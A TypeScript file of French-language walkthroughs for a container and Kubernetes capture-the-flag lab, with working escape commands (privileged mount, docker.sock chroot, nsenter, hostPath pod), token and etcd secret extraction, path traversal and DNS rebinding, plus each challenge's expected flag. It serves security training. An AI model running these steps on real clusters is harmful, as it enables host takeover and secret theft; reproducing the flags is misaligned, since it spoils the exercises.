import { ChallengeGuide } from '../guides';

export const guides: Record<string, ChallengeGuide> = {
  "4.1.1": {
    "context": "Le conteneur cible fonctionne avec des privilèges élevés (mode privileged ou équivalent), lui donnant accès à presque toutes les fonctionnalités de l'hôte, y compris la possibilité de monter des périphériques blocs.",
    "objective": "Échapper au conteneur en montant le système de fichiers de la machine hôte pour récupérer le flag.",
    "concepts": [
      "Docker",
      "Privileged Container",
      "Mount",
      "Container Escape"
    ],
    "steps": [
      {
        "title": "Recherche des périphériques de l'hôte",
        "command": "lsblk",
        "detail": "La commande lsblk (ou fdisk -l) permet d'identifier les partitions de la machine hôte (par exemple /dev/sda1)."
      },
      {
        "title": "Création d'un point de montage",
        "command": "mkdir /mnt/host",
        "detail": "Créez un dossier qui servira de point de montage pour la partition de l'hôte."
      },
      {
        "title": "Montage du système de fichiers",
        "command": "mount /dev/sda1 /mnt/host",
        "detail": "Montez la partition principale de l'hôte dans le dossier /mnt/host. Vous avez maintenant accès aux fichiers de l'hôte depuis le conteneur."
      },
      {
        "title": "Récupération du flag",
        "command": "cat /mnt/host/root/flag.txt",
        "detail": "Cherchez le flag sur le système de l'hôte. Le flag attendu est **PCE{escap3d_pr1v_c0ntain3r_2026}**."
      }
    ]
  },
  "4.1.2": {
    "context": "Le socket Docker de la machine hôte (/var/run/docker.sock) est monté à l'intérieur du conteneur. Cela permet au conteneur de communiquer avec le daemon Docker de l'hôte.",
    "objective": "Exploiter le montage du socket Docker pour créer un nouveau conteneur privilégié et s'évader.",
    "concepts": [
      "Docker Socket",
      "RCE",
      "Privilege Escalation",
      "Container Escape"
    ],
    "steps": [
      {
        "title": "Vérification de la présence du socket",
        "command": "ls -la /var/run/docker.sock",
        "detail": "Vérifiez que le fichier docker.sock est bien présent et accessible dans le conteneur."
      },
      {
        "title": "Lancement d'un conteneur d'évasion",
        "command": "docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh",
        "detail": "Cette commande demande au daemon de l'hôte de lancer un nouveau conteneur, en montant la racine de l'hôte dans /host, et d'exécuter un shell via chroot. Vous êtes maintenant root sur l'hôte !"
      },
      {
        "title": "Lecture du flag",
        "command": "cat /root/flag.txt",
        "detail": "Le flag attendu est **PCE{d0ck3r_s0ck3t_rc3_pwnd_2026}**."
      }
    ]
  },
  "4.1.3": {
    "context": "Certains conteneurs mal configurés peuvent partager le namespace PID avec l'hôte (hostPID: true), permettant d'accéder aux processus de l'hôte et de s'y insérer.",
    "objective": "Utiliser nsenter pour s'échapper du conteneur en rejoignant le namespace de montage (mount) de l'hôte.",
    "concepts": [
      "Namespaces",
      "nsenter",
      "Container Breakout",
      "Linux Capabilities"
    ],
    "steps": [
      {
        "title": "Recherche du PID 1 de l'hôte",
        "command": "ps aux",
        "detail": "Puisque le namespace PID est partagé, vous verrez les processus de l'hôte, y compris le PID 1 (généralement init ou systemd)."
      },
      {
        "title": "Évasion avec nsenter",
        "command": "nsenter -t 1 -m -u -n -i sh",
        "detail": "La commande nsenter permet d'exécuter un shell dans les namespaces du PID 1 de l'hôte (mount, UTS, network, IPC). On obtient ainsi un shell direct sur l'hôte."
      },
      {
        "title": "Récupération du flag",
        "command": "cat /root/flag.txt",
        "detail": "Le flag attendu est **PCE{nsenter_mount_breakout_2024}**."
      }
    ]
  },
  "4.1.4": {
    "context": "De nombreuses images Docker contiennent des secrets codés en dur qui ont été ajoutés lors de la construction (build) de l'image, puis supprimés dans une couche ultérieure avec rm.",
    "objective": "Analyser les couches (layers) de l'image Docker pour extraire des secrets cachés.",
    "concepts": [
      "Docker Image Layers",
      "Secret Scanning",
      "Image History"
    ],
    "steps": [
      {
        "title": "Analyse de l'historique de l'image",
        "command": "cat ~/pce-payments-api-image/history.txt",
        "detail": "Examinez l'historique de construction de l'image. Vous pouvez y voir qu'un fichier deploy-creds.env a été copié puis supprimé."
      },
      {
        "title": "Recherche de secrets dans les couches",
        "command": "grep -r \"PCE{\" ~/pce-payments-api-image",
        "detail": "Fouillez dans les dossiers extraits pour trouver le contenu du fichier dans les anciennes couches, avant sa suppression."
      },
      {
        "title": "Lecture du secret",
        "command": "cat ~/pce-payments-api-image/layers/04/app/deploy-creds.env",
        "detail": "Le fichier reste lisible dans sa couche d'origine. Le flag attendu est **PCE{docker_layer_hardcoded_secret_2024}**."
      }
    ]
  },
  "4.2.1": {
    "context": "L'autorisation dans Kubernetes utilise RBAC. Un ClusterRoleBinding permet de lier un rôle à un utilisateur ou service account au niveau du cluster entier. Ici, un compte possède trop de permissions.",
    "objective": "Exploiter un ClusterRoleBinding trop permissif pour obtenir un accès d'administrateur (cluster-admin).",
    "concepts": [
      "Kubernetes",
      "RBAC",
      "ClusterRoleBinding",
      "Privilege Escalation"
    ],
    "steps": [
      {
        "title": "Recherche des rôles administratifs",
        "command": "kubectl get clusterroles",
        "detail": "Identifiez les rôles existants pour voir lesquels possèdent des privilèges `cluster-admin` (souvent verbs:* / resources:*)."
      },
      {
        "title": "Analyse des ClusterRoleBindings",
        "command": "kubectl get clusterrolebindings",
        "detail": "Listez les liaisons de rôles pour voir à qui sont attribués les rôles privilégiés. Cherchez les liaisons suspectes (hors kube-system)."
      },
      {
        "title": "Audit automatisé et récupération du flag",
        "command": "kubectl audit-rbac",
        "detail": "Utilisez la commande d'audit maison pour repérer la liaison fautive. Elle révèle la configuration excessive. Le flag attendu est **PCE{k8s_clusteradmin_binding_2024}**."
      }
    ]
  },
  "4.2.2": {
    "context": "Le Kubernetes Dashboard ou l'API Kubernetes locale est parfois exposée sans authentification. Cela permet à quiconque d'interagir avec le cluster avec des droits élevés.",
    "objective": "Accéder à l'API Kubernetes exposée sans authentification et extraire les informations sensibles.",
    "concepts": [
      "Kubernetes API",
      "Misconfiguration",
      "Unauthenticated Access"
    ],
    "steps": [
      {
        "title": "Vérification de l'API exposée",
        "command": "curl http://localhost:8001/",
        "detail": "L'API Kubernetes est exposée sur le port 8001 localement sans authentification."
      },
      {
        "title": "Recherche de secrets via l'API",
        "command": "curl http://localhost:8001/api/v1/namespaces/default/secrets",
        "detail": "Puisque l'API est ouverte, vous pouvez lister les secrets du namespace `default`."
      },
      {
        "title": "Décodage du flag",
        "command": "echo \"UENFe2s4c19kNHNoYjA0cmRfbjBfNHV0aF8yMDI2fQ==\" | base64 -d",
        "detail": "Dans la réponse JSON, le flag est encodé en base64. Le flag attendu est **PCE{k8s_d4shb04rd_n0_4uth_2026}**."
      }
    ]
  },
  "4.2.3": {
    "context": "Etcd est la base de données clé-valeur de Kubernetes. Si elle n'est pas chiffrée au repos ou est accessible sans authentification, les secrets peuvent être compromis.",
    "objective": "Se connecter à la base de données etcd via etcdctl et extraire les secrets stockés en clair.",
    "concepts": [
      "Kubernetes",
      "etcd",
      "Secrets",
      "Encryption at Rest"
    ],
    "steps": [
      {
        "title": "Interrogation de la base etcd",
        "command": "etcdctl get / --prefix --keys-only",
        "detail": "Affichez toutes les clés stockées dans etcd. Vous y verrez des clés sensibles comme /registry/secrets/default/admin-token."
      },
      {
        "title": "Lecture du secret",
        "command": "etcdctl get /registry/secrets/default/admin-token",
        "detail": "Lisez la valeur brute du secret dans etcd. Comme la base n'est pas chiffrée, le flag est en clair. Le flag attendu est **PCE{etcd_secrets_unencrypted_2024}**."
      }
    ]
  },
  "4.2.4": {
    "context": "Un Service Account (SA) est associé à chaque Pod. Si le token de ce SA dispose de privilèges excessifs sur l'API Kubernetes, il peut être utilisé pour attaquer le cluster.",
    "objective": "Extraire le token du Service Account monté dans le Pod et l'utiliser pour lire les secrets de l'API.",
    "concepts": [
      "Service Account",
      "Token Abuse",
      "Kubernetes API",
      "Privilege Escalation"
    ],
    "steps": [
      {
        "title": "Localisation du token",
        "command": "export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)",
        "detail": "Le token JWT est monté automatiquement dans le conteneur. On le stocke dans une variable d'environnement."
      },
      {
        "title": "Lecture des secrets via l'API",
        "command": "curl -k -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/secrets",
        "detail": "L'API Kubernetes authentifie le token et retourne la liste des secrets du namespace (car le Service Account a les droits nécessaires)."
      },
      {
        "title": "Décodage du flag",
        "command": "echo \"UENFe2s4c19zYV90b2tlbl9hYnVzZWRfMjAyNH0=\" | base64 -d",
        "detail": "Le flag est renvoyé encodé en base64. Le flag attendu est **PCE{k8s_sa_token_abused_2024}**."
      }
    ]
  },
  "4.3.1": {
    "context": "Les NetworkPolicies dans Kubernetes agissent comme un pare-feu interne. Si un namespace ne configure pas de règle de blocage par défaut (default-deny), il acceptera toutes les connexions entrantes.",
    "objective": "Auditer les règles réseau du cluster pour identifier le namespace qui permet le trafic cross-namespace non désiré.",
    "concepts": [
      "NetworkPolicy",
      "Lateral Movement",
      "Namespace Isolation"
    ],
    "steps": [
      {
        "title": "Analyse des NetworkPolicies",
        "command": "kubectl get networkpolicies -A",
        "detail": "Listez les règles réseau appliquées. L'objectif est d'identifier si un namespace n'applique pas de règle par défaut (default-deny)."
      },
      {
        "title": "Audit automatisé",
        "command": "kubectl audit-netpol",
        "detail": "Utilisez la commande d'audit du lab pour détecter automatiquement le namespace vulnérable. Le flag attendu est **PCE{k8s_networkpolicy_gap_2024}**."
      }
    ]
  },
  "4.3.2": {
    "context": "Un Ingress Controller gère le routage entrant vers les services. Une mauvaise configuration des règles de réécriture de chemin (rewrite-target) peut permettre de s'échapper du chemin prévu et d'atteindre des endpoints internes.",
    "objective": "Exploiter une mauvaise configuration de l'Ingress (Path Traversal) pour accéder à un panel d'administration interne.",
    "concepts": [
      "Ingress Controller",
      "Misconfiguration",
      "Path Traversal",
      "Rewrite Target"
    ],
    "steps": [
      {
        "title": "Test de l'application publique",
        "command": "curl http://localhost:8080/app/",
        "detail": "L'application publique est accessible normalement sous le chemin `/app/`."
      },
      {
        "title": "Tentative d'accès direct à l'admin",
        "command": "curl http://localhost:8080/admin",
        "detail": "L'accès direct renvoie un 403 Forbidden car la règle Ingress ne couvre pas explicitement /admin."
      },
      {
        "title": "Contournement par Path Traversal",
        "command": "curl http://localhost:8080/app/../admin",
        "detail": "En passant par /app/ avec un `../`, le contrôleur Ingress (ou le backend) normalise le chemin et vous donne accès à /admin. Le flag attendu est **PCE{ingr3ss_byp4ss_2026}**."
      }
    ]
  },
  "4.3.3": {
    "context": "Le DNS Rebinding est une attaque où un nom de domaine résout d'abord vers une IP autorisée, puis rapidement vers une IP cible (comme 127.0.0.1) pour contourner les validations SSRF (Time of Check to Time of Use).",
    "objective": "Utiliser un script DNS Rebinding pour tromper le service ssrf_tool.py et lui faire lire l'API metadata locale.",
    "concepts": [
      "DNS Rebinding",
      "SSRF",
      "TOCTOU",
      "Kubernetes Networking"
    ],
    "steps": [
      {
        "title": "Démarrage du serveur DNS malveillant",
        "command": "sudo python3 dns_server_skeleton.py",
        "detail": "Ce script simule un serveur DNS qui renvoie 8.8.8.8 à la première requête, puis 127.0.0.1 à la seconde requête."
      },
      {
        "title": "Configuration de la résolution locale",
        "command": "echo \"nameserver 127.0.0.1\" | sudo tee /etc/resolv.conf",
        "detail": "Forcez le système à utiliser votre serveur DNS local pour qu'il intercepte les requêtes DNS de ssrf_tool.py."
      },
      {
        "title": "Exécution de l'exploit SSRF",
        "command": "python3 ssrf_tool.py http://rebind.local:8080/latest/meta-data/",
        "detail": "L'outil valide rebind.local (8.8.8.8), puis le télécharge (127.0.0.1), révélant la réponse de l'API interne. Le flag attendu est **PCE{k8s_dns_rebinding_2024}**."
      }
    ]
  },
  "4.4.1": {
    "context": "L'exécution de conteneurs en tant qu'utilisateur root (runAsUser: 0) est une mauvaise pratique. Si le pod est compromis, l'attaquant obtient les droits root à l'intérieur du conteneur.",
    "objective": "Auditer les configurations de Pods pour trouver ceux qui tournent en root et violent les Pod Security Standards.",
    "concepts": [
      "Pod Security",
      "RunAsRoot",
      "Security Context"
    ],
    "steps": [
      {
        "title": "Audit manuel des Pods",
        "command": "kubectl get pods -A",
        "detail": "Commencez par lister tous les pods déployés sur le cluster pour les inspecter un à un."
      },
      {
        "title": "Inspection des SecurityContext",
        "command": "kubectl describe pod <nom_du_pod>",
        "detail": "Vérifiez les règles SecurityContext appliquées (absence de runAsNonRoot, runAsUser à 0, privileged, etc)."
      },
      {
        "title": "Audit automatisé et flag",
        "command": "kubectl audit-podsecurity",
        "detail": "La commande d'audit maison liste les pods vulnérables tournant en root. Le flag attendu est **PCE{k8s_pods_run_as_root_2024}**."
      }
    ]
  },
  "4.4.2": {
    "context": "La capability CAP_SYS_ADMIN accorde des privilèges énormes au conteneur, similaires au mode privileged. Elle permet notamment de monter des périphériques hôtes directement.",
    "objective": "Exploiter la capability CAP_SYS_ADMIN pour monter la partition principale de l'hôte et lire le flag.",
    "concepts": [
      "Linux Capabilities",
      "CAP_SYS_ADMIN",
      "Container Escape",
      "Mount"
    ],
    "steps": [
      {
        "title": "Vérification des capabilities",
        "command": "capsh --print",
        "detail": "Vérifiez la présence de cap_sys_admin dans la liste des capabilities du conteneur."
      },
      {
        "title": "Montage du système de fichiers de l'hôte",
        "command": "mkdir -p /mnt/host && mount /dev/sda1 /mnt/host",
        "detail": "Grâce à CAP_SYS_ADMIN, vous pouvez invoquer la commande mount et lier la partition /dev/sda1 de l'hôte au dossier /mnt/host."
      },
      {
        "title": "Récupération du flag",
        "command": "cat /mnt/host/root_flag.txt",
        "detail": "L'outil mock du lab crée le fichier dès que la commande de montage réussit. Le flag attendu est **PCE{sys_admin_c4p_m0unt_2024}**."
      }
    ]
  },
  "4.4.3": {
    "context": "Les Admission Controllers (via Pod Security Policies ou Pod Security Admission) empêchent le déploiement de Pods dangereux. Cependant, des règles permissives (ex: autoriser hostPath) créent des failles.",
    "objective": "Contourner un Admission Controller mal configuré en utilisant un volume hostPath pour monter la racine de l'hôte.",
    "concepts": [
      "Admission Controller",
      "PodSecurityPolicy",
      "Bypass",
      "hostPath"
    ],
    "steps": [
      {
        "title": "Analyse des restrictions",
        "command": "kubectl apply -f bad-pod.yaml",
        "detail": "Tentez de créer un Pod avec privileged: true. Le contrôleur le bloque car cette option n'est pas autorisée par la PSP en place."
      },
      {
        "title": "Création du Pod exploit avec hostPath",
        "command": "cat <<EOF > exploit.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: psp-bypass\nspec:\n  containers:\n  - name: alpine\n    image: alpine\n    volumeMounts:\n    - mountPath: /host\n      name: host-vol\n  volumes:\n  - name: host-vol\n    hostPath:\n      path: /\nEOF",
        "detail": "Le contrôleur n'a pas bloqué l'utilisation de volumes de type hostPath. On configure donc le Pod pour monter / de l'hôte."
      },
      {
        "title": "Déploiement et récupération du flag",
        "command": "kubectl apply -f exploit.yaml",
        "detail": "Le mock du lab accepte le manifeste et simule la réussite du montage. Le flag attendu est **PCE{psp_bypass_2024}**."
      }
    ]
  }
};
